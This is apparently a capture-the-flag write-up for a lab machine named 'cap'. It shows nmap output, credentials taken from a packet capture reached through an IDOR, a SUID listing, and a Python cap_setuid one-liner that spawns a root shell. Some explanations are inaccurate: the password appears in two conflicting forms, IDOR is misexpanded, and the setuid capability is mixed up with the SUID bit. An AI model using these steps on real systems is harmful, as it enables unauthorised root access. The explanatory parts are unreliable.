
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Mon, 15 Sep 2025 11:14:58 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 15 Sep 2025 11:14:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 15 Sep 2025 11:14:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=9/15%Time=68C7FB39%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2F31,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Mon,\x2015\x20Sep\x202025\x2011:14:52\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\
SF:n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x2
SF:015\x20Sep\x202025\x2011:14:52\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP
SF:TIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
SF:/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20M
SF:on,\x2015\x20Sep\x202025\x2011:14:58\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

On `0.pcap` followed the FTP TCP stream and got nathan:Buck3tH4TF0RM3!
Got in as nathan on FTP, passwd was reused on ssh

Found some SUID bit files
```
nathan@cap:~$ find / -perm -4000 -type f -ls 2>/dev/null
      789     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
      834     44 -rwsr-xr-x   1 root     root        44784 May 28  2020 /usr/bin/newgrp
      888     32 -rwsr-xr-x   1 root     root        31032 Aug 16  2019 /usr/bin/pkexec
      788     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
      686     88 -rwsr-xr-x   1 root     root        88464 May 28  2020 /usr/bin/gpasswd
      867     68 -rwsr-xr-x   1 root     root        68208 May 28  2020 /usr/bin/passwd
      557     84 -rwsr-xr-x   1 root     root        85064 May 28  2020 /usr/bin/chfn
     2865    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
      489     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
      563     52 -rwsr-xr-x   1 root     root        53040 May 28  2020 /usr/bin/chsh
     3422     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
      668     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
     1588     24 -rwsr-xr-x   1 root     root        22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     2279    128 -rwsr-xr-x   1 root     root       130152 Feb  2  2021 /usr/lib/snapd/snap-confine
     1435    464 -rwsr-xr-x   1 root     root       473576 Mar  9  2021 /usr/lib/openssh/ssh-keysign
     1366     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1373     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
      128    109 -rwsr-xr-x   1 root     root         111080 Apr 24  2021 /snap/snapd/11841/usr/lib/snapd/snap-confine
      128    109 -rwsr-xr-x   1 root     root         111080 Jun 15  2021 /snap/snapd/12398/usr/lib/snapd/snap-confine
       56     43 -rwsr-xr-x   1 root     root          43088 Sep 16  2020 /snap/core18/2066/bin/mount
       65     63 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /snap/core18/2066/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /snap/core18/2066/bin/su
       99     27 -rwsr-xr-x   1 root     root          26696 Sep 16  2020 /snap/core18/2066/bin/umount
     1708     75 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /snap/core18/2066/usr/bin/chfn
     1710     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /snap/core18/2066/usr/bin/chsh
     1763     75 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /snap/core18/2066/usr/bin/gpasswd
     1827     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /snap/core18/2066/usr/bin/newgrp
     1840     59 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /snap/core18/2066/usr/bin/passwd
     1931    146 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /snap/core18/2066/usr/bin/sudo
     2018     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2328    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/2066/usr/lib/openssh/ssh-keysign
       56     43 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /snap/core18/2074/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/2074/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/2074/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /snap/core18/2074/bin/umount
     1710     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/2074/usr/bin/chfn
     1712     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/2074/usr/bin/chsh
     1765     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/2074/usr/bin/gpasswd
     1829     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/2074/usr/bin/newgrp
     1842     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/2074/usr/bin/passwd
     1933    146 -rwsr-xr-x   1 root     root              149080 Jan 19  2021 /snap/core18/2074/usr/bin/sudo
     2020     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2330    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/2074/usr/lib/openssh/ssh-keysign

```

Lol `/tmp/elliot/linpeas.sh` raixa ran that
Got this `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

and did this 
`nathan@cap:/tmp$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

we got root~

## I. Overview of the Challenge

The challenge involves exploiting a web application to retrieve packet captures, analyzing them to find credentials, and then escalating privileges on the system using a specific capability.

## II. Initial Reconnaissance and Enumeration

### A. Nmap Scan

1. **Purpose:** To identify open ports and services running on the target machine.
2. **Command:** nmap -sc -sv -oA nmap/cap 10.10.10.245 (or similar)

- **Key Findings:**Port 21: FTP (vsftpd 3.0.3)
- Port 22: SSH (OpenSSH)
- Port 80: HTTP (Gunicorn, likely a Python Flask/Django application)

### B. FTP Enumeration (Port 21)

1. **Banner Grabbing:** Initial connection to identify the FTP server and version (vsftpd 3.0.3).
2. **Vulnerability Search:** Using searchsploit vsftpd revealed no direct exploits for version 3.0.3.
3. **Anonymous Login:** Attempted ftp anonymous login, which failed. Nmap also typically checks for this.
4. **Conclusion:** No immediate vulnerabilities or entry points found via FTP. Brute-forcing was deemed inefficient without known usernames.

### C. HTTP Enumeration (Port 80)

1. **Web Server Identification:** Gunicorn strongly suggests a Python web application (Flask or Django). The absence of a /admin path pointed towards Flask.
2. **Initial Page Interaction:** The main page presented "Security Snapshot" and other links. Interacting with the "Capture" link redirected to /data/2, which downloaded a packet capture file (.pcap).
3. **Observation of Network Output:** Pages like /data/ip and /data/netstat displayed output similar to ifconfig and netstat commands, but were static and did not appear to allow command injection.

## III. Gaining User Access (Foothold)

### A. Packet Capture Vulnerability (IDOR)

1. **Discovery:** The web application allowed downloading packet captures sequentially (e.g., /data/1, /data/2). By decrementing the ID (e.g., trying /data/0), it was possible to download other users' session captures. This is an Indirect Object Reference (IDOR) vulnerability.
2. **Impact:** Downloading 0.pcap (presumably from an administrator or another user).

### B. Analyzing the Packet Capture

1. **Tool:** Wireshark was used to analyze 0.pcap. Alternatively, Zeek (formerly Bro) with appropriate configuration could be used to extract logs.
2. **Key Discovery:** Following TCP streams within the capture revealed FTP credentials: nathan:bucketstartswithhathatorm3.

### C. Logging into FTP

1. **Credentials:** nathan:bucketstartswithhathatorm3
2. **Actions:** Logged in successfully to FTP. Found user.txt. Attempted to create an SSH directory (.ssh) but was denied permission. Checked for bash_history, bashrc, .viminfo, etc., but could not modify them.

### D. Logging into SSH

1. **Credentials:** Reused the FTP credentials (nathan:bucketstartswithhathatorm3) for SSH access.
2. **Success:** Successfully logged in as nathan.

## IV. Privilege Escalation (Root)

### A. Initial Post-Exploitation Enumeration

1. **Web Server Files:** Examined app.py in /var/www/html/. Confirmed Flask was used. Looked for hardcoded credentials or command injection points, but found none. The /data/id endpoint was confirmed to only accept integers, preventing path traversal or other injection.
2. **LinPEAS:** Transferred and executed linpeas.sh to automate privilege escalation checks.

### B. LinPEAS Key Findings

1. **Capabilities:** linpeas.sh highlighted that python3.8 had the setuid capability.
2. **Verification:** Checked ls -la /usr/bin/python3.8 and confirmed it was owned by root.

### C. Exploiting setuid Capability

1. **Mechanism:** The setuid capability allows a program to run with the effective user ID of the file owner (in this case, root), regardless of the user who executes it.

- **Exploitation Steps:**Execute python3.
- Import the os module: import os.
- Set the effective user ID to 0 (root): os.setuid(0).
- Execute a shell: os.system("sh").

1. **Result:** Gained a root shell.

### D. Accessing Root Flag

1. **Location:** cd /root
2. **Flag:** root.txt